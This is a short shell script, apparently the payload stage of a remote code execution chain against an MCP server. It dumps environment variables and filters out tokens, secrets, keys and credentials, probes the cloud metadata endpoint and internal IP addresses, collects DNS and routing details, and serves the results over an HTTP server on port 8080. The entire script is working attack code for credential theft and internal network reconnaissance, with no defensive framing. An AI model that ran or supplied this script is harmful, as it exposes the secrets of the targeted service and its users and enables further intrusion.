#!/bin/sh
# S14 MCP RCE chain: env secrets + internal net probe
{
  echo "=== ENV ==="
  env | sort | head -60
  echo "=== ENV (sensitive) ==="
  env | grep -iE "token|secret|key|pass|cred|aiven|url" | head -30
  echo "=== NET probe (Aiven internal) ==="
  for ip in 169.254.169.254 10.0.0.1 172.17.0.1 10.10.0.1; do
    r=$(curl -s -o /dev/null -w "%{http_code}" --max-time 4 "http://$ip:80/" 2>&1)
    echo "$ip:80 -> $r"
  done
  echo "=== DNS ==="
  cat /etc/resolv.conf
  echo "=== default route ==="
  ip route 2>/dev/null || netstat -rn 2>/dev/null | head -5
} > /app/chain.txt 2>&1
printf 'CHAIN host=%s uid=%s\n' "$(hostname)" "$(id -u)" > /app/index.html
exec python3 -m http.server 8080
